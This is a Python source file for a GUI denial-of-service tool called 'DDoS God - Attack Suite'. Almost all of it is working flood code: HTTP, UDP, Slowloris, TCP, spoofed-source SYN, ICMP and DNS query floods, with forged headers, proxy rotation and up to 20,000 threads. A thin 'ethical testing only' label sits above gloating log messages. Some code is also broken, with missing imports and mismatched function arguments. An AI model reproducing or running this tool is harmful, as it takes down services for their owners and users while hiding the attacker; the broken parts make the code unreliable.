#!/usr/bin/env python3
import sys
import threading
import time
import random
import socket
import struct
import ipaddress
import tkinter as tk
from tkinter import ttk, scrolledtext, Menu, messagebox, filedialog
import urllib.parse
import requests
import os
import ssl
import dns.resolver
import logging
import queue
import re
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('DDoS_God')

# Cyberpunk theme
class CyberTheme:
    DARK_BG = "#0a0a12"
    DARK_FG = "#e0e0ff"
    ACCENT1 = "#00ffea"
    ACCENT2 = "#ff2a6d"
    ACCENT3 = "#05d9e8"
    HIGHLIGHT = "#d1f7ff"
    WARNING = "#ff9a00"
    CRITICAL = "#ff2a6d"
    SUCCESS = "#39ff14"
    DDoS_COLOR = "#ff5500"
    
    @staticmethod
    def apply_theme(widget):
        try:
            if hasattr(widget, 'configure'):
                options = {}
                if 'background' in widget.keys():
                    options['background'] = CyberTheme.DARK_BG
                elif 'bg' in widget.keys():
                    options['bg'] = CyberTheme.DARK_BG
                if 'foreground' in widget.keys():
                    options['foreground'] = CyberTheme.DARK_FG
                elif 'fg' in widget.keys():
                    options['fg'] = CyberTheme.DARK_FG
                if 'highlightbackground' in widget.keys():
                    options['highlightbackground'] = CyberTheme.ACCENT1
                if 'highlightcolor' in widget.keys():
                    options['highlightcolor'] = CyberTheme.ACCENT1
                if 'insertbackground' in widget.keys():
                    options['insertbackground'] = CyberTheme.HIGHLIGHT
                if options:
                    widget.configure(**options)
        except:
            pass

# Fake user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.4) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

# Fake IPs
fake_ips = [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(10000)]

# Random headers
def random_headers(host):
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Host": host,
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": random.choice(fake_ips),
        "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com"]),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }

# Fetch proxies
def fetch_proxies():
    try:
        url = "https://www.proxy-list.download/api/v1/get?type=http"
        response = requests.get(url, timeout=5)
        proxies = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)', response.text)
        return proxies
    except Exception as e:
        logger.error(f"Failed to fetch proxies: {e}")
        return []

# Test proxy
def test_proxy(proxy, target_ip, target_port):
    try:
        proxy_ip, proxy_port = proxy.split(':')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((proxy_ip, int(proxy_port)))
        s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('ascii'))
        response = s.recv(1024)
        s.close()
        return b"200" in response
    except:
        return False

# Load proxies
def load_proxies(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

# DDoS Tool UI
class DDoSToolUI:
    def __init__(self, master):
        self.master = master
        self.master.title('⚡ DDoS God - Attack Suite')
        self.master.configure(bg=CyberTheme.DARK_BG)
        self.packet_count = 0
        self.active_threads = 0
        self.attack_queue = queue.Queue()
        self.proxies = []
        self.attack_thread = None
        self.running = False

        # Window size
        screen_width = master.winfo_screenwidth()
        screen_height = master.winfo_screenheight()
        window_width = min(1200, screen_width - 100)
        window_height = min(800, screen_height - 100)
        master.geometry(f"{window_width}x{window_height}+{int((screen_width - window_width)/2)}+{int((screen_height - window_height)/2)}")
        master.resizable(True, True)

        # Header
        self.header_frame = tk.Frame(master, bg=CyberTheme.DARK_BG)
        self.header_frame.pack(fill=tk.X, pady=(10, 20))
        tk.Label(self.header_frame, text="⚡ DDoS God - Attack Suite", font=("Courier", 24, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG).pack(side=tk.LEFT, padx=20)
        tk.Label(self.header_frame, text="FOR ETHICAL TESTING ONLY", font=("Courier", 10), fg=CyberTheme.ACCENT3, bg=CyberTheme.DARK_BG).pack(side=tk.LEFT, padx=10)

        # Main frame
        self.main_frame = tk.Frame(master, bg=CyberTheme.DARK_BG)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        # Control panel
        self.control_frame = tk.LabelFrame(self.main_frame, text="ATTACK CONTROLS", font=("Courier", 10, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG, relief=tk.GROOVE)
        self.control_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10), pady=10)

        # Target
        tk.Label(self.control_frame, text="TARGET (URL/IP):", font=("Courier", 9, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG).pack(fill=tk.X, padx=10)
        self.target_entry = tk.Entry(self.control_frame, width=40, font=("Courier", 10), bg="#1a1a2e", fg=CyberTheme.DARK_FG, insertbackground=CyberTheme.HIGHLIGHT, highlightcolor=CyberTheme.DDoS_COLOR)
        self.target_entry.pack(fill=tk.X, padx=10, pady=(0, 10))
        self.target_entry.insert(0, "http://")

        # Port
        tk.Label(self.control_frame, text="PORT (0 for ICMP/SYN):", font=("Courier", 9, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG).pack(fill=tk.X, padx=10)
        self.port_entry = tk.Entry(self.control_frame, width=10, font=("Courier", 10), bg="#1a1a2e", fg=CyberTheme.DARK_FG, insertbackground=CyberTheme.HIGHLIGHT, highlightcolor=CyberTheme.DDoS_COLOR)
        self.port_entry.pack(fill=tk.X, padx=10, pady=(0, 10))
        self.port_entry.insert(0, "80")

        # Attack type
        tk.Label(self.control_frame, text="ATTACK TYPE:", font=("Courier", 9, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG).pack(fill=tk.X, padx=10)
        self.attack_type_var = tk.StringVar(value="http")
        self.attack_type_menu = ttk.Combobox(self.control_frame, textvariable=self.attack_type_var, values=["http", "udp", "slowloris", "tcp", "syn", "icmp", "dns"], state="readonly")
        self.attack_type_menu.pack(fill=tk.X, padx=10, pady=(0, 10))
        CyberTheme.apply_theme(self.attack_type_menu)

        # Threads
        tk.Label(self.control_frame, text="THREADS (100-20000):", font=("Courier", 9, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG).pack(fill=tk.X, padx=10)
        self.threads_var = tk.StringVar(value="5000")
        self.threads_scale = tk.Scale(self.control_frame, from_=100, to=20000, orient=tk.HORIZONTAL, variable=self.threads_var, bg=CyberTheme.DARK_BG, fg=CyberTheme.DDoS_COLOR, troughcolor="#1a1a2e", highlightthickness=0)
        self.threads_scale.pack(fill=tk.X, padx=10, pady=(0, 10))

        # Duration
        tk.Label(self.control_frame, text="DURATION (seconds):", font=("Courier", 9, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG).pack(fill=tk.X, padx=10)
        self.duration_var = tk.StringVar(value="600")
        self.duration_entry = tk.Entry(self.control_frame, width=10, textvariable=self.duration_var, font=("Courier", 10), bg="#1a1a2e", fg=CyberTheme.DARK_FG, insertbackground=CyberTheme.HIGHLIGHT, highlightcolor=CyberTheme.DDoS_COLOR)
        self.duration_entry.pack(fill=tk.X, padx=10, pady=(0, 10))

        # Proxies
        tk.Label(self.control_frame, text="PROXY SETTINGS:", font=("Courier", 9, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG).pack(fill=tk.X, padx=10)
        self.proxy_var = tk.BooleanVar()
        tk.Checkbutton(self.control_frame, text="Use Proxies", variable=self.proxy_var, bg=CyberTheme.DARK_BG, fg=CyberTheme.DARK_FG, selectcolor=CyberTheme.ACCENT1).pack(fill=tk.X, padx=10)
        self.proxy_file_entry = tk.Entry(self.control_frame, width=40, font=("Courier", 10), bg="#1a1a2e", fg=CyberTheme.DARK_FG, insertbackground=CyberTheme.HIGHLIGHT, highlightcolor=CyberTheme.DDoS_COLOR)
        self.proxy_file_entry.pack(fill=tk.X, padx=10, pady=(0, 5))
        tk.Button(self.control_frame, text="Load Proxy File", command=self.load_proxy_file, bg=CyberTheme.ACCENT1, fg=CyberTheme.DARK_BG, font=("Courier", 10)).pack(fill=tk.X, padx=10, pady=(0, 10))
        tk.Button(self.control_frame, text="Auto-Fetch Proxies", command=self.fetch_proxies, bg=CyberTheme.ACCENT1, fg=CyberTheme.DARK_BG, font=("Courier", 10)).pack(fill=tk.X, padx=10, pady=(0, 10))

        # SSL
        self.ssl_var = tk.BooleanVar()
        tk.Checkbutton(self.control_frame, text="Use SSL (HTTP/Slowloris/TCP)", variable=self.ssl_var, bg=CyberTheme.DARK_BG, fg=CyberTheme.DARK_FG, selectcolor=CyberTheme.ACCENT1).pack(fill=tk.X, padx=10)

        # Buttons
        tk.Button(self.control_frame, text="⚡ Launch Attack", command=self.start_attack, bg=CyberTheme.DDoS_COLOR, fg=CyberTheme.DARK_BG, font=("Courier", 12, "bold")).pack(fill=tk.X, padx=10, pady=(20, 10))
        tk.Button(self.control_frame, text="Stop Attack", command=self.stop_attack, bg=CyberTheme.CRITICAL, fg=CyberTheme.DARK_BG, font=("Courier", 12, "bold")).pack(fill=tk.X, padx=10, pady=(0, 10))

        # Log panel
        self.log_frame = tk.LabelFrame(self.main_frame, text="ATTACK LOG", font=("Courier", 10, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG, relief=tk.GROOVE)
        self.log_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0), pady=10)
        self.log_text = scrolledtext.ScrolledText(self.log_frame, height=20, font=("Courier", 10), bg="#1a1a2e", fg=CyberTheme.DARK_FG, insertbackground=CyberTheme.HIGHLIGHT)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Stats panel
        self.stats_frame = tk.LabelFrame(self.main_frame, text="STATS", font=("Courier", 10, "bold"), fg=CyberTheme.DDoS_COLOR, bg=CyberTheme.DARK_BG, relief=tk.GROOVE)
        self.stats_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=(0, 10), pady=(10, 0))
        self.packets_label = tk.Label(self.stats_frame, text="Packets Sent: 0", font=("Courier", 10), bg=CyberTheme.DARK_BG, fg=CyberTheme.SUCCESS)
        self.packets_label.pack(fill=tk.X, padx=10)
        self.threads_label = tk.Label(self.stats_frame, text="Active Threads: 0", font=("Courier", 10), bg=CyberTheme.DARK_BG, fg=CyberTheme.SUCCESS)
        self.threads_label.pack(fill=tk.X, padx=10)
        self.proxies_label = tk.Label(self.stats_frame, text="Working Proxies: 0", font=("Courier", 10), bg=CyberTheme.DARK_BG, fg=CyberTheme.SUCCESS)
        self.proxies_label.pack(fill=tk.X, padx=10)

        # Menu
        menubar = Menu(master, bg=CyberTheme.DARK_BG, fg=CyberTheme.DARK_FG)
        file_menu = Menu(menubar, tearoff=0, bg=CyberTheme.DARK_BG, fg=CyberTheme.DARK_FG)
        file_menu.add_command(label="Exit", command=master.quit)
        menubar.add_cascade(label="File", menu=file_menu)
        master.config(menu=menubar)

        # Apply theme
        for widget in [self.header_frame, self.main_frame, self.control_frame, self.log_frame, self.stats_frame]:
            CyberTheme.apply_theme(widget)
            for child in widget.winfo_children():
                CyberTheme.apply_theme(child)

        # Logging handler
        self.log_handler = logging.StreamHandler(sys.stdout)
        self.log_handler.flush = sys.stdout.flush
        logger.addHandler(self.log_handler)
        self.redirect_logs()

    def redirect_logs(self):
        class LogRedirector:
            def __init__(self, text_widget):
                self.text_widget = text_widget
            def write(self, message):
                self.text_widget.insert(tk.END, message)
                self.text_widget.see(tk.END)
            def flush(self):
                pass
        sys.stdout = LogRedirector(self.log_text)

    def load_proxy_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.proxy_file_entry.delete(0, tk.END)
            self.proxy_file_entry.insert(0, file_path)
            self.proxies = load_proxies(file_path)
            self.proxies = [p for p in self.proxies if test_proxy(p, self.target_ip, int(self.port_entry.get()))]
            self.proxies_label.config(text=f"Working Proxies: {len(self.proxies)}")
            logger.info(f"Loaded {len(self.proxies)} working proxies from {file_path}")

    def fetch_proxies(self):
        self.proxies = fetch_proxies()
        self.proxies = [p for p in self.proxies if test_proxy(p, self.target_ip, int(self.port_entry.get()))]
        self.proxies_label.config(text=f"Working Proxies: {len(self.proxies)}")
        logger.info(f"Fetched {len(self.proxies)} working proxies")

    def start_attack(self):
        if self.running:
            messagebox.showwarning("Warning", "Attack already running!")
            return
        target = self.target_entry.get()
        try:
            if target.startswith("http://") or target.startswith("https://"):
                parsed = urllib.parse.urlparse(target)
                target = parsed.hostname
            if not target.replace('.', '').isdigit():
                answers = dns.resolver.resolve(target, 'A')
                self.target_ip = answers[0].address
            else:
                self.target_ip = target
        except Exception as e:
            messagebox.showerror("Error", f"Invalid target: {e}")
            return
        try:
            threads = int(self.threads_var.get())
            duration = int(self.duration_var.get())
            port = int(self.port_entry.get())
            attack_type = self.attack_type_var.get()
            use_ssl = self.ssl_var.get()
            self.running = True
            self.packet_count = 0
            self.active_threads = 0
            self.attack_queue.queue.clear()
            for _ in range(threads):
                self.attack_queue.put(1)
            self.attack_thread = threading.Thread(target=self.run_attack, args=(self.target_ip, port, attack_type, duration, self.proxies, use_ssl))
            self.attack_thread.daemon = True
            self.attack_thread.start()
            self.update_stats()
        except Exception as e:
            messagebox.showerror("Error", f"Invalid input: {e}")
            self.running = False

    def stop_attack(self):
        self.running = False
        self.attack_queue.queue.clear()
        self.log_text.insert(tk.END, "Attack stopped. Target probably shitting itself.\n")

    def update_stats(self):
        if self.running:
            self.packets_label.config(text=f"Packets Sent: {self.packet_count}")
            self.threads_label.config(text=f"Active Threads: {self.active_threads}")
            self.master.after(1000, self.update_stats)

    # Attack functions
    def http_flood(self, target_ip, target_port, duration, proxies, use_ssl, q):
        start_time = time.time()
        while q.qsize() > 0 and (duration == 0 or time.time() < start_time + duration) and self.running:
            try:
                proxy = random.choice(proxies) if proxies else None
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if use_ssl:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=target_ip)
                if proxy:
                    proxy_ip, proxy_port = proxy.split(':')
                    s.connect((proxy_ip, int(proxy_port)))
                    s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('ascii'))
                    if b"200" not in s.recv(1024):
                        s.close()
                        continue
                else:
                    s.connect((target_ip, target_port))
                headers = random_headers(target_ip)
                method = random.choice(['GET', 'POST'])
                path = f"/?{random.randint(1,1000000)}={random.randint(1,1000000)}"
                request = f"{method} {path} HTTP/1.1\r\n"
                for k, v in headers.items():
                    request += f"{k}: {v}\r\n"
                if method == 'POST':
                    post_data = urllib.parse.urlencode({f'param{random.randint(1,10)}': random._urandom(512).hex() for _ in range(10)})
                    request += f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(post_data)}\r\n\r\n{post_data}"
                else:
                    request += "\r\n"
                s.send(request.encode('ascii'))
                self.packet_count += 1
                logger.info(f"HTTP {method} slammed from {headers['X-Forwarded-For']} | Packets: {self.packet_count}")
                s.close()
            except Exception as e:
                logger.debug(f"HTTP error: {e}")
            time.sleep(0.005)

    def udp_flood(self, target_ip, target_port, duration, q):
        start_time = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while q.qsize() > 0 and (duration == 0 or time.time() < start_time + duration) and self.running:
            try:
                data = random._urandom(random.randint(1024, 65535))
                s.sendto(data, (target_ip, target_port))
                self.packet_count += 1
                logger.info(f"UDP bomb dropped | Packets: {self.packet_count}")
            except Exception as e:
                logger.debug(f"UDP error: {e}")
            time.sleep(0.001)

    def slowloris(self, target_ip, target_port, duration, proxies, use_ssl, q):
        sockets = []
        start_time = time.time()
        while q.qsize() > 0 and (duration == 0 or time.time() < start_time + duration) and self.running:
            try:
                if len(sockets) < 500:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    if use_ssl:
                        context = ssl.create_default_context()
                        s = context.wrap_socket(s, server_hostname=target_ip)
                    proxy = random.choice(proxies) if proxies else None
                    if proxy:
                        proxy_ip, proxy_port = proxy.split(':')
                        s.connect((proxy_ip, int(proxy_port)))
                        s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('ascii'))
                        if b"200" not in s.recv(1024):
                            s.close()
                            continue
                    else:
                        s.connect((target_ip, target_port))
                    headers = random_headers(target_ip)
                    request = f"GET /?{random.randint(1,1000000)} HTTP/1.1\r\n"
                    for k, v in headers.items():
                        request += f"{k}: {v}\r\n"
                    request += f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(request.encode('ascii'))
                    sockets.append(s)
                    self.packet_count += 1
                    logger.info(f"Slowloris socket opened: {len(sockets)} active | Packets: {self.packet_count}")
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-b: {random.randint(1, 5000)}\r\n".encode('ascii'))
                        self.packet_count += 1
                    except:
                        sockets.remove(sock)
                        sock.close()
                time.sleep(10)
            except Exception as e:
                logger.debug(f"Slowloris error: {e}")
        for sock in sockets:
            sock.close()

    def tcp_flood(self, target_ip, target_port, duration, proxies, use_ssl, q):
        start_time = time.time()
        while q.qsize() > 0 and (duration == 0 or time.time() < start_time + duration) and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if use_ssl:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=target_ip)
                proxy = random.choice(proxies) if proxies else None
                if proxy:
                    proxy_ip, proxy_port = proxy.split(':')
                    s.connect((proxy_ip, int(proxy_port)))
                    s.send(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('ascii'))
                    if b"200" not in s.recv(1024):
                        s.close()
                        continue
                else:
                    s.connect((target_ip, target_port))
                self.packet_count += 1
                logger.info(f"TCP connection dropped | Packets: {self.packet_count}")
                s.close()
            except Exception as e:
                logger.debug(f"TCP error: {e}")
            time.sleep(0.002)

    def syn_flood(self, target_ip, target_port, duration, q):
        start_time = time.time()
        while q.qsize() > 0 and (duration == 0 or time.time() < start_time + duration) and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip = random.choice(fake_ips)
                ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(1,65535), 64, socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(target_ip))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), target_port, random.randint(1,0xFFFFFFFF), 0, 2, 0, 8192, 0, 0)
                packet = ip_header + tcp_header
                s.sendto(packet, (target_ip, 0))
                self.packet_count += 1
                logger.info(f"SYN packet slammed from {src_ip} | Packets: {self.packet_count}")
            except Exception as e:
                logger.debug(f"SYN error: {e}")
            time.sleep(0.001)

    def icmp_flood(self, target_ip, duration, q):
        start_time = time.time()
        while q.qsize() > 0 and (duration == 0 or time.time() < start_time + duration) and self.running:
            try:
                os.system(f"ping -c 1 -s {random.randint(1000, 5000)} {target_ip}")
                self.packet_count += 1
                logger.info(f"ICMP bomb dropped | Packets: {self.packet_count}")
            except Exception as e:
                logger.debug(f"ICMP error: {e}")
            time.sleep(0.001)

    def dns_amplification(self, target_ip, duration, q):
        start_time = time.time()
        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2
        resolver.lifetime = 2
        while q.qsize() > 0 and (duration == 0 or time.time() < start_time + duration) and self.running:
            try:
                resolver.nameservers = [random.choice(dns_servers)]
                query = dns.message.make_query(target_ip, 'ANY')
                for ns in dns_servers:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.settimeout(2)
                    s.sendto(query.to_wire(), (ns, 53))
                    self.packet_count += 1
                    logger.info(f"DNS query sent to {ns} | Packets: {self.packet_count}")
                time.sleep(0.05)
            except Exception as e:
                logger.debug(f"DNS error: {e}")
        s.close()

    def run_attack(self, target_ip, target_port, attack_type, duration, proxies, use_ssl):
        attack_funcs = {
            'http': self.http_flood,
            'udp': self.udp_flood,
            'slowloris': self.slowloris,
            'tcp': self.tcp_flood,
            'syn': self.syn_flood,
            'icmp': self.icmp_flood,
            'dns': self.dns_amplification
        }
        attack_func = attack_funcs.get(attack_type, self.http_flood)
        threads = int(self.threads_var.get())
        self.active_threads = threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack_func, target_ip, target_port, duration, proxies, use_ssl, self.attack_queue) if attack_type in ['http', 'slowloris', 'tcp'] else executor.submit(attack_func, target_ip, duration, self.attack_queue) for _ in range(threads)]
            for future in as_completed(futures):
                self.active_threads -= 1
        self.running = False

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSToolUI(root)
    root.mainloop()
